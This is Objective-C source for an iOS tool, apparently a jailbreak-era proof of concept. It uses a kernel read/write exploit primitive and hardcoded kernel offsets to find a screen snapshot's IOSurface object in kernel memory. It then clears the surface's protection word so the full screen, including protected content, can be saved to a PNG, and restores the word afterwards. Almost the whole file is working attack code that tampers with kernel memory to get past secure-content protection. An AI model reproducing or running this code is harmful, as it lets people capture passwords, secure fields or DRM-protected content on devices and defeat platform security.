#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <ImageIO/ImageIO.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <math.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>

#include <libjailbreak/info.h>
#include "common.h"
#include "krw.h"
#include "poc.h"

KernelOffsetInfo gSystemInfo;

typedef int (*CreateSnapshotsFn)(uint32_t, IOSurfaceRef *, IOSurfaceRef *, NSDictionary *);
typedef uint64_t (*GetProtectionFn)(IOSurfaceRef);
typedef int (*AcceleratorCreateFn)(CFAllocatorRef, uint32_t, void **);
typedef int (*AcceleratorTransferFn)(void *, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef, void *, void *, void *);

static void set_number(CFMutableDictionaryRef props, CFStringRef key, int64_t value) {
    CFNumberRef boxed = CFNumberCreate(NULL, kCFNumberSInt64Type, &value);
    CFDictionarySetValue(props, key, boxed);
    CFRelease(boxed);
}

static NSDictionary *snapshot_options(NSString *mode, NSString *display, size_t width, size_t height) {
    NSNumber *size_width = @(width);
    NSNumber *size_height = @(height);
    return @{@"mode": mode, @"displayName": display, @"sizeWidth": size_width, @"sizeHeight": size_height, @"enforceSecureMode": @YES};
}

static IOSurfaceRef new_bgra_surface(size_t width, size_t height) {
    if (!width || !height || width > 4096 || height > 4096) {
        return NULL;
    }

    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    set_number(props, CFSTR("IOSurfaceWidth"), width);
    set_number(props, CFSTR("IOSurfaceHeight"), height);
    set_number(props, CFSTR("IOSurfaceBytesPerRow"), width * 4);
    set_number(props, CFSTR("IOSurfaceBytesPerElement"), 4);
    set_number(props, CFSTR("IOSurfaceAllocSize"), width * height * 4);
    set_number(props, CFSTR("IOSurfacePixelFormat"), 0x42475241);
    set_number(props, CFSTR("IOSurfaceProtectionOptions"), 0);
    IOSurfaceRef surface = IOSurfaceCreate(props);
    CFRelease(props);
    return surface;
}

static bool write_png(IOSurfaceRef surface, const char *path) {
    if (!surface || IOSurfaceLock(surface, kIOSurfaceLockReadOnly, NULL)) {
        return false;
    }

    bool ok = false;
    void *base = IOSurfaceGetBaseAddress(surface);
    if (base) {
        CGColorSpaceRef color = CGColorSpaceCreateDeviceRGB();
        size_t width = IOSurfaceGetWidth(surface);
        size_t height = IOSurfaceGetHeight(surface);
        size_t bytes_per_row = IOSurfaceGetBytesPerRow(surface);
        CGBitmapInfo format = kCGBitmapByteOrder32Little | kCGImageAlphaPremultipliedFirst;
        CGContextRef bitmap = CGBitmapContextCreate(base, width, height, 8, bytes_per_row, color, format);
        CGImageRef image = bitmap ? CGBitmapContextCreateImage(bitmap) : NULL;
        CFURLRef url = CFURLCreateFromFileSystemRepresentation(NULL, (const UInt8 *)path, strlen(path), false);
        CGImageDestinationRef output = image && url ? CGImageDestinationCreateWithURL(url, CFSTR("public.png"), 1, NULL) : NULL;
        if (output) {
            CGImageDestinationAddImage(output, image, NULL);
            ok = CGImageDestinationFinalize(output);
        }

        if (output) {
            CFRelease(output);
        }

        if (url) {
            CFRelease(url);
        }

        if (image) {
            CGImageRelease(image);
        }

        if (bitmap) {
            CGContextRelease(bitmap);
        }

        CGColorSpaceRelease(color);
    }

    IOSurfaceUnlock(surface, kIOSurfaceLockReadOnly, NULL);
    return ok;
}

static int transfer_to_bgra(IOSurfaceRef source, IOSurfaceRef destination, AcceleratorCreateFn create, AcceleratorTransferFn transfer) {
    void *accelerator = NULL;
    int status = create(NULL, 0, &accelerator);
    if (status || !accelerator) {
        return status ? status : -1;
    }

    status = transfer(accelerator, source, destination, NULL, NULL, NULL, NULL);
    CFRelease(accelerator);
    return status;
}

static bool kernel_read64(uint64_t address, uint64_t *value) {
    uint8_t data[32];
    if (!krw_read_32_bytes(address, data)) {
        return false;
    }

    memcpy(value, data, sizeof(*value));
    return true;
}

static bool kernel_read32(uint64_t address, uint32_t *value) {
    uint8_t data[32];
    if (!krw_read_32_bytes(address, data)) {
        return false;
    }

    memcpy(value, data, sizeof(*value));
    return true;
}

static bool kernel_surface_object(uint32_t surface_id, uint64_t *out_object) {
    const uint64_t slide = g_ctx.kernel_slide;
    const uint64_t root_global = UINT64_C(0xfffffff007b8e6f0) + slide;
    const uint64_t expected_vtable = UINT64_C(0xfffffff006cfc468) + slide;
    uint64_t root = 0, table = 0, object = 0, vtable = 0;
    uint32_t capacity = 0, object_id = 0;
    if (!kernel_read64(root_global, &root) || root <= UINT64_C(0xfffff00000000000)) {
        return false;
    }

    if (!kernel_read64(root + 0xd0, &table) || !kernel_read32(root + 0xd8, &capacity)) {
        return false;
    }

    if (capacity < 1 || capacity > 4096 || surface_id >= capacity || table <= UINT64_C(0xfffff00000000000)) {
        return false;
    }

    if (!kernel_read64(table + (uint64_t)surface_id * 8, &object) || object <= UINT64_C(0xfffff00000000000)) {
        return false;
    }

    if (!kernel_read64(object, &vtable) || !kernel_read32(object + 0x10, &object_id)) {
        return false;
    }

    if (vtable != expected_vtable || object_id != surface_id) {
        return false;
    }

    printf("surface_object=0x%llx id=%u\n", (unsigned long long)object, surface_id);
    *out_object = object;
    return true;
}

static bool set_protection_word(uint64_t field, uint32_t expected, uint32_t replacement) {
    uint8_t data[32];
    if (!krw_read_32_bytes(field, data)) {
        return false;
    }

    uint32_t old = 0;
    memcpy(&old, data, sizeof(old));
    if (old != expected) {
        return false;
    }

    memcpy(data, &replacement, sizeof(replacement));
    if (!krw_write_32_bytes(field, data)) {
        return false;
    }

    uint32_t observed = UINT32_MAX;
    return kernel_read32(field, &observed) && observed == replacement;
}

static void initialize_offsets(void) {
    gSystemInfo.kernelConstant.staticBase = UINT64_C(0xfffffff007004000);
    gSystemInfo.kernelStruct.inpcb.list_next = 0x20;
    gSystemInfo.kernelStruct.inpcb.pcbinfo = 0x38;
    gSystemInfo.kernelStruct.inpcb.socket = 0x40;
    gSystemInfo.kernelStruct.inpcb.icmp6filt = 0x148;
    gSystemInfo.kernelStruct.inpcbinfo.ipi_zone = 0x68;
    gSystemInfo.kernelStruct.kalloc_type_view.kt_zv_zv_name = 0x10;
    gSystemInfo.kernelStruct.socket.proto = 0x20;
    gSystemInfo.kernelStruct.socket.usecount = 0x254;
    gSystemInfo.kernelStruct.protosw.input = 0x28;
}

static int copy_surface(IOSurfaceRef source, IOSurfaceRef destination, AcceleratorCreateFn create, AcceleratorTransferFn transfer) {
    initialize_offsets();
    if (clearsword_run() != 0) {
        fprintf(stderr, "kernel research primitive unavailable\n");
        return -1;
    }

    uint32_t kernel_magic = 0;
    if (!kernel_read32(g_ctx.kernel_base, &kernel_magic) || kernel_magic != 0xfeedfacf) {
        fprintf(stderr, "kernel read control failed (magic=0x%08x)\n", kernel_magic);
        return -1;
    }

    uint64_t object = 0;
    uint32_t surface_id = IOSurfaceGetID(source);
    if (!kernel_surface_object(surface_id, &object)) {
        fprintf(stderr, "surface identity did not validate\n");
        return -1;
    }

    const uint64_t field = object + 0x390;
    uint32_t protection_word = UINT32_MAX;
    if (!kernel_read32(field, &protection_word) || protection_word != 3 || IOSurfaceGetBaseAddress(source) != NULL) {
        fprintf(stderr, "protected surface precondition failed (word=%u)\n", protection_word);
        return -1;
    }

    if (!set_protection_word(field, 3, 0)) {
        uint32_t observed = UINT32_MAX;
        if (kernel_read32(field, &observed) && observed == 0) {
            (void)set_protection_word(field, 0, 3);
        }

        if (!kernel_read32(field, &observed) || observed != 3) {
            return -1;
        }

        return -1;
    }

    int copied = transfer_to_bgra(source, destination, create, transfer);
    if (!set_protection_word(field, 0, 3)) {
        uint32_t observed = UINT32_MAX;
        if (!kernel_read32(field, &observed) || observed != 3) {
            return -1;
        }

        fprintf(stderr, "protection restored, but write verification failed\n");
        return -1;
    }

    printf("protection_restored=3\n");
    return copied;
}

int main(int argc, char **argv) {
    if (argc == 2 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
        printf("usage: %s OUTPUT.png\n", argv[0]);
        printf("Captures the full screen, including protected content.\n");
        return 0;
    }

    if (argc != 2 || !argv[1][0]) {
        fprintf(stderr, "usage: %s OUTPUT.png\n", argv[0]);
        return 2;
    }

    @autoreleasepool {
        void *quartzcore = dlopen("/System/Library/Frameworks/QuartzCore.framework/QuartzCore", RTLD_NOW);
        void *accelerator_image = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_NOW);
        CreateSnapshotsFn snapshots = quartzcore ? dlsym(quartzcore, "CARenderServerCreateSnapshots") : NULL;
        CFStringRef *display_mode = quartzcore ? dlsym(quartzcore, "kCASnapshotModeDisplay") : NULL;
        GetProtectionFn protection = dlsym(RTLD_DEFAULT, "IOSurfaceGetProtectionOptions");
        AcceleratorCreateFn create = accelerator_image ? dlsym(accelerator_image, "IOSurfaceAcceleratorCreate") : NULL;
        AcceleratorTransferFn transfer = accelerator_image ? dlsym(accelerator_image, "IOSurfaceAcceleratorTransferSurface") : NULL;
        if (!snapshots || !display_mode || !*display_mode || !protection || !create || !transfer) {
            fprintf(stderr, "required capture API unavailable\n");
            return 3;
        }

        UIScreen *screen = [UIScreen mainScreen];
        NSString *(*screen_name)(id, SEL) = (NSString *(*)(id, SEL))objc_msgSend;
        NSString *display = screen_name(screen, sel_registerName("_name"));
        if (![display isKindOfClass:[NSString class]]) {
            return 3;
        }

        CGSize logical_size = [screen bounds].size;
        CGSize native_size = [screen nativeBounds].size;
        if ((logical_size.width > logical_size.height) != (native_size.width > native_size.height)) {
            CGFloat swapped = native_size.width;
            native_size.width = native_size.height;
            native_size.height = swapped;
        }

        size_t width = (size_t)llround(native_size.width);
        size_t height = (size_t)llround(native_size.height);
        if (!width || !height || width > 4096 || height > 4096) {
            return 3;
        }

        printf("display_size=native:%zux%zu logical:%.0fx%.0f\n", width, height, logical_size.width, logical_size.height);
        NSString *mode = (__bridge NSString *)*display_mode;
        NSDictionary *options = snapshot_options(mode, display, width, height);
        IOSurfaceRef ordinary = NULL, protected = NULL;
        int result = snapshots(0, &ordinary, &protected, options);
        bool snapshot_failed = !result || (!ordinary && !protected);
        bool size_differs = width != (size_t)logical_size.width || height != (size_t)logical_size.height;
        bool logical_size_valid = logical_size.width > 0 && logical_size.height > 0;
        if (snapshot_failed && size_differs && logical_size_valid) {
            if (ordinary) {
                CFRelease(ordinary);
            }

            if (protected) {
                CFRelease(protected);
            }

            ordinary = NULL;
            protected = NULL;
            options = snapshot_options(mode, display, (size_t)logical_size.width, (size_t)logical_size.height);
            printf("retrying_snapshot_at_logical_size\n");
            result = snapshots(0, &ordinary, &protected, options);
        }

        printf("snapshot_status=%d\n", result);
        if (!result || (!ordinary && !protected)) {
            if (protected) {
                CFRelease(protected);
            }

            if (ordinary) {
                CFRelease(ordinary);
            }

            return 4;
        }

        IOSurfaceRef source = protected ? protected : ordinary;
        IOSurfaceRef output = new_bgra_surface(IOSurfaceGetWidth(source), IOSurfaceGetHeight(source));
        int copy_status = -1;
        if (source && output) {
            if (protection(source) == 3) {
                copy_status = copy_surface(source, output, create, transfer);
            } else if (protection(source) == 0) {
                copy_status = transfer_to_bgra(source, output, create, transfer);
            }

        }

        printf("copy_status=0x%08x\n", copy_status);
        bool written = copy_status == 0 && output && protection(output) == 0 && write_png(output, argv[1]);
        printf("png_written=%d\n", written);
        if (written) {
            printf("saved=%s\n", argv[1]);
        }

        if (output) {
            CFRelease(output);
        }

        if (protected) {
            CFRelease(protected);
        }

        if (ordinary) {
            CFRelease(ordinary);
        }

        return written ? 0 : 5;
    }
}
